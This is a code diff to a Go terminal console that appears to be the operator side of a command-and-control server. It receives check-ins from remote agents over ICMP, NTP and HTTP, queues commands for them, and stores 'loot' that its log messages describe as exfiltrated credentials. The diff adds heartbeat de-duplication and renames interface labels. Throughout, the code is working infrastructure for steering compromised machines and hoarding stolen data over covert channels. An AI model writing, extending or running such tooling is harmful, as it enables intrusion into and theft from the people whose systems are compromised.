@@ -54,6 +54,10 @@ var (
 	// Spinner
 	spinnerIdx    = 0
 	spinnerFrames = []string{"▰▱▱▱▱", "▰▰▱▱▱", "▰▰▰▱▱", "▰▰▰▰▱", "▰▰▰▰▰", "▱▰▰▰▰", "▱▱▰▰▰", "▱▱▱▰▰", "▱▱▱▱▰"}
+
+	// State tracking for de-duplication (Anti-Flood)
+	lastStateMap = make(map[string]string)
+	stateMutex   sync.Mutex
 )
 
 type Telemetry struct {
@@ -80,75 +84,88 @@ type Loot struct {
 // --- NETWORK LOGIC & HEARTBEAT ---
 
 func LogHeartbeat(transport string, t Telemetry) {
-    arrival := time.Now()
-    t.Transport = transport
-    t.LastSeen = arrival
+	arrival := time.Now()
+	t.Transport = transport
+	t.LastSeen = arrival
 
-    // Capture if this is new intel
-    isNewLoot := IngestLoot(t)
+	// --- FILTRO DE ESTADO (Anti-Flood / Jitter Protection) ---
+	stateMutex.Lock()
+	lastPreview, exists := lastStateMap[t.AgentID]
+	
+	// Determinamos si es un cambio sustancial:
+	isSubstantiveChange := !exists || (t.ArtifactPreview != lastPreview && t.ArtifactPreview != "")
+	
+	if !isSubstantiveChange && !strings.HasPrefix(t.ArtifactPreview, "OUT:") {
+		stateMutex.Unlock()
+		agentMutex.Lock()
+		activeAgents[t.AgentID] = &t
+		agentMutex.Unlock()
+		return 
+	}
+	
+	lastStateMap[t.AgentID] = t.ArtifactPreview
+	stateMutex.Unlock()
 
-    agentMutex.Lock()
-    _, alreadyKnown := activeAgents[t.AgentID]
-    activeAgents[t.AgentID] = &t
-    agentMutex.Unlock()
+	// --- PROCESAMIENTO DE LOOT ---
+	isNewLoot := IngestLoot(t)
 
-    app.QueueUpdateDraw(func() {
-        // ... (Metrics calculation remains the same) ...
-        rtt := int(time.Since(arrival).Microseconds())
-        if lastRTT != 0 {
-            diff := rtt - lastRTT
-            if diff < 0 { diff = -diff }
-            currentJitter = diff
-        }
-        lastRTT = rtt
+	agentMutex.Lock()
+	_, alreadyKnown := activeAgents[t.AgentID]
+	activeAgents[t.AgentID] = &t
+	agentMutex.Unlock()
 
-        refreshAgentTable()
-        ts := arrival.Format("15:04:05")
+	app.QueueUpdateDraw(func() {
+		rtt := int(time.Since(arrival).Microseconds())
+		if lastRTT != 0 {
+			diff := rtt - lastRTT
+			if diff < 0 { diff = -diff }
+			currentJitter = diff
+		}
+		lastRTT = rtt
 
-        if strings.HasPrefix(t.ArtifactPreview, "OUT:") {
-            fmt.Fprintf(agentLog, "[%s] [black:lightgreen][ MISSION RESULT ][-:-] [blue]%s[white]: %s\n",
-                ts, t.AgentID, t.ArtifactPreview[4:])
-        } else if isNewLoot {
-            // ONLY log loot if it was unique
-            fmt.Fprintf(agentLog, "[%s] [black:yellow][ LOOT ACQUIRED ][-:-] [blue]%s[white] exfiltrated unique credentials\n",
-                ts, t.AgentID)
-        } else if !alreadyKnown {
-            fmt.Fprintf(agentLog, "[%s] [blue]NODE_JOIN[white] %s established via %s\n",
-                ts, t.AgentID, transport)
-        }
-        // Routine "WAIT" heartbeats or duplicate loot are now completely silent.
-    })
+		refreshAgentTable()
+		ts := arrival.Format("15:04:05")
+
+		// Corregida sintaxis de bloques if/else
+		if strings.HasPrefix(t.ArtifactPreview, "OUT:") {
+			fmt.Fprintf(agentLog, "[%s] [black:lightgreen][ EXEC_SUCCESS ][-:-] [blue]%s[white] > %s\n",
+				ts, t.AgentID, t.ArtifactPreview[4:])
+		} else if isNewLoot {
+			fmt.Fprintf(agentLog, "[%s] [black:yellow][ INTEL_CONFIRMED ][-:-] [blue]%s[white] exfiltrated unique telemetry\n",
+				ts, t.AgentID)
+		} else if !alreadyKnown {
+			fmt.Fprintf(agentLog, "[%s] [blue]NODE_LINKED[white] Agent %s via %s\n",
+				ts, t.AgentID, transport)
+		}
+	})
 }
 
-// --- UPDATED LOOT INGESTION (DEDUPLICATED) ---
-
 func IngestLoot(t Telemetry) bool {
-    if strings.HasPrefix(t.ArtifactPreview, "LOOT:") {
-        parts := strings.SplitN(t.ArtifactPreview, ":", 3)
-        if len(parts) == 3 {
-            category := parts[1]
-            data := parts[2]
+	if strings.HasPrefix(t.ArtifactPreview, "LOOT:") {
+		parts := strings.SplitN(t.ArtifactPreview, ":", 3)
+		if len(parts) == 3 {
+			category := parts[1]
+			data := parts[2]
 
-            lootMutex.Lock()
-            defer lootMutex.Unlock()
+			lootMutex.Lock()
+			defer lootMutex.Unlock()
 
-            // Check for existing entry
-            for _, item := range vault {
-                if item.AgentID == t.AgentID && item.Category == category && item.Data == data {
-                    return false // Duplicate data, do not alert
-                }
-            }
+			for _, item := range vault {
+				if item.AgentID == t.AgentID && item.Category == category && item.Data == data {
+					return false 
+				}
+			}
 
-            vault = append(vault, Loot{
-                AgentID:   t.AgentID,
-                Category:  category,
-                Data:      data,
-                Timestamp: time.Now(),
-            })
-            return true // NEW unique loot saved
-        }
-    }
-    return false
+			vault = append(vault, Loot{
+				AgentID:   t.AgentID,
+				Category:  category,
+				Data:      data,
+				Timestamp: time.Now(),
+			})
+			return true 
+		}
+	}
+	return false
 }
 
 // --- LISTENER PROTOCOLS (ICMP, DNS, NTP) ---
@@ -248,17 +265,14 @@ func processRawPayload(data []byte, peer string, tier string) {
 
 func refreshAgentTable() {
 	agentList.Clear()
-	// RE-NAMED HEADERS FOR TOTAL REALITY
-	headers := []string{"AGENT ID", "TRANSPORT", "IDENTITY", "DEFENSE", "LATENCY (µs)"}
+	headers := []string{"NODE_ID", "COMMS_CHANNEL", "USER_CONTEXT", "SECURITY_PROFILE", "RTT_LATENCY"}
 	for c, h := range headers {
 		agentList.SetCell(0, c, tview.NewTableCell("[black:blue] "+h+" ").SetSelectable(false).SetAlign(tview.AlignCenter))
 	}
 
 	agentMutex.Lock()
 	keys := make([]string, 0, len(activeAgents))
-	for k := range activeAgents {
-		keys = append(keys, k)
-	}
+	for k := range activeAgents { keys = append(keys, k) }
 	sort.Strings(keys)
 
 	for r, k := range keys {
@@ -290,10 +304,10 @@ func handleCommand(cmd string) {
 		taskMutex.Lock()
 		agentTasks[targetID] = command
 		taskMutex.Unlock()
-		fmt.Fprintf(agentLog, "[%s] [yellow]AUTH_CHECK >[white] Objective Queued for %s: %s\n", ts, targetID, command)
+		fmt.Fprintf(agentLog, "[%s] [yellow]MISSION_QUEUED >[white] Objective for %s: %s\n", ts, targetID, command)
 	case "tasks":
 		taskMutex.Lock()
-		fmt.Fprintf(agentLog, "[%s] [blue]QUEUE_DUMP:[white]\n", ts)
+		fmt.Fprintf(agentLog, "[%s] [blue]BUFFER_DUMP:[white]\n", ts)
 		for id, c := range agentTasks {
 			fmt.Fprintf(agentLog, "  - %s -> %s\n", id, c)
 		}
@@ -301,9 +315,9 @@ func handleCommand(cmd string) {
 	case "loot":
 		lootMutex.Lock()
 		if len(vault) == 0 {
-			fmt.Fprintf(agentLog, "[%s] [yellow]VAULT_EMPTY:[white] No credentials exfiltrated.\n", ts)
+			fmt.Fprintf(agentLog, "[%s] [yellow]VAULT_EMPTY:[white] No data exfiltrated.\n", ts)
 		} else {
-			fmt.Fprintf(agentLog, "[%s] [blue]SECURE_VAULT_ACCESS:[white]\n", ts)
+			fmt.Fprintf(agentLog, "[%s] [blue]ENCRYPTED_VAULT_ACCESS:[white]\n", ts)
 			for _, item := range vault {
 				fmt.Fprintf(agentLog, "  [cyan]%s[white] | [yellow]%s[white] | %s\n",
 					item.AgentID, item.Category, item.Data)
@@ -323,7 +337,7 @@ func initiateShutdown() {
 	agentLog.Clear()
 	fmt.Fprintf(agentLog, "[red:black:b]!!! INITIATING SCORCHED EARTH PROTOCOL !!![white]\n")
 	go func() {
-		steps := []string{"Destroying RSA Keypairs...", "Flushing Signal Buffers...", "Dismantling Covert Channels...", "Hardware Halt."}
+		steps := []string{"Wiping RSA Keypairs...", "Flushing Signal Buffers...", "Dismantling Channels...", "Hardware Halt."}
 		for _, step := range steps {
 			time.Sleep(200 * time.Millisecond)
 			app.QueueUpdateDraw(func() { fmt.Fprintf(agentLog, "[red]SHUTDOWN:[white] %s\n", step) })
@@ -333,39 +347,32 @@ func initiateShutdown() {
 	}()
 }
 
-// --- MAIN ENGINE ---
-
 func main() {
 	app = tview.NewApplication()
 
-	// Load history from file 
 	if data, err := os.ReadFile(historyFile); err == nil {
 		cmdHistory = strings.Split(strings.TrimSpace(string(data)), "\n")
 	}
 
-	// 1. HEADER
 	header := tview.NewTextView().SetDynamicColors(true).SetTextAlign(tview.AlignCenter).
 		SetText(`[blue:black:b]
    █  █ █▀▀▄ █▀▀▄ █▀▀▄ ▄▀▀▄      █ █  ▄▀▀▄ █▀▀▄ █▀▄▀█      ▄▀▀▀  ▄▀▀▄ 
-   █▀▀█ █  █ █  █ █▄▄▀ █▄▄█ ▀▀   █ █  █  █ █▄▄▀ █ █ █     █     █▄▄█ 
-   █  █ █▄▄▀ █▄▄▀ █  █ █  █      ▀▄▀  ▀▄▄▀ █  █ █   █      ▀▄▄▄ █  █ 
+   █▀▀█ █  █ █  █ █▄▄▀ █▄▄█ ▀▀   █ █  █  █ █▄▄▀ █ █ █      █     █▄▄█ 
+   █  █ █▄▄▀ █▄▄▀ █  █ █  █      ▀▄▀  ▀▄▄▀ █  █ █  █       ▀▄▄▄ █  █ 
 [white]────────────────────────────────────────────────────────────────────────
-[yellow]STATION: COVERT_NODE_B64 | [blue]OSINT LINK: ESTABLISHED[white]
-[green]TIER-1: ONLINE | TIER-2: ONLINE | [red]THREAT LEVEL: CRITICAL[white]`)
+[yellow]STATION: COVERT_NODE_B64 | [blue]PULSE_LINK: ESTABLISHED[white]
+[green]TIER-1: ONLINE | TIER-2: ONLINE | [red]THREAT_LEVEL: CRITICAL[white]`)
 
-	// 2. AGENT TABLE
 	agentList = tview.NewTable().SetBorders(false)
 	agentList.SetTitle(" [blue]ACTIVE_SPECTRUM[white] ").SetBorder(true).SetBorderColor(tcell.GetColor("blue"))
 	refreshAgentTable()
 
-	// 3. ENCRYPTED LOGS
 	agentLog = tview.NewTextView().SetDynamicColors(true).SetWordWrap(true).SetChangedFunc(func() {
 		app.Draw()
 		agentLog.ScrollToEnd()
 	})
 	agentLog.SetTitle(" [white]ENCRYPTED TRANSMISSIONS[white] ").SetBorder(true).SetBorderColor(tcell.GetColor("green"))
 
-	// 4. STATUS & INPUT
 	statusFooter = tview.NewTextView().SetDynamicColors(true)
 
 	cmdInput = tview.NewInputField().
@@ -373,7 +380,6 @@ func main() {
 		SetFieldBackgroundColor(tcell.ColorBlack)
 	cmdInput.SetBorder(true).SetBorderColor(tcell.GetColor("blue"))
 
-	// --- INPUT CAPTURE: HISTORY & AUTOCOMPLETE --- 
 	cmdInput.SetInputCapture(func(event *tcell.EventKey) *tcell.EventKey {
 		switch event.Key() {
 		case tcell.KeyUp:
@@ -413,7 +419,6 @@ func main() {
 			text := cmdInput.GetText()
 			if text != "" {
 				handleCommand(text)
-				// Persistent History Save 
 				cmdHistory = append(cmdHistory, text)
 				f, _ := os.OpenFile(historyFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 				f.WriteString(text + "\n")
@@ -424,14 +429,12 @@ func main() {
 		}
 	})
 
-	// LAYOUT
 	flex := tview.NewFlex().SetDirection(tview.FlexRow).
 		AddItem(header, 9, 1, false).
 		AddItem(tview.NewFlex().AddItem(agentList, 45, 1, false).AddItem(agentLog, 0, 2, false), 0, 4, false).
 		AddItem(statusFooter, 1, 1, false).
 		AddItem(cmdInput, 3, 1, true)
 
-	// LISTENERS
 	go StartIcmpListener()
 	go StartNtpListener()
 	go func() {
@@ -456,7 +459,7 @@ func main() {
 				delete(agentTasks, t.AgentID)
 			}
 			taskMutex.Unlock()
-			c.JSON(200, gin.H{"status": "cloud_verified", "task": task, "epoch": time.Now().Unix()})
+			c.JSON(200, gin.H{"status": "verified", "task": task, "epoch": time.Now().Unix()})
 		}
 	})
 	r.POST("/api/v1/heartbeat", func(c *gin.Context) {
@@ -468,16 +471,14 @@ func main() {
 	})
 	go r.Run(":8080")
 
-	// STATUS REFRESHER (Using Real-Time Metrics) 
 	go func() {
 		for {
 			time.Sleep(250 * time.Millisecond)
 			app.QueueUpdateDraw(func() {
 				spinnerIdx = (spinnerIdx + 1) % len(spinnerFrames)
 				ts := time.Now().Format("15:04:05")
-				// RE-NAMED FOOTER FOR CONSISTENCY
 				statusFooter.SetText(fmt.Sprintf(
-					" [blue]SYNCING %s [white]| [yellow]T_STAMP: %s | [red]LATENCY: %d µs [white]| [magenta]JITTER: %d µs [white]| [blue]ENCRYPTION: AES-256-GCM",
+					" [blue]SYNC_PULSE %s [white]| [yellow]T_STAMP: %s | [red]LATENCY: %d µs [white]| [magenta]JITTER: %d µs [white]| [blue]ENCRYPTION: AES-256-GCM/X25519",
 					spinnerFrames[spinnerIdx], ts, lastRTT, currentJitter))
 			})
 		}
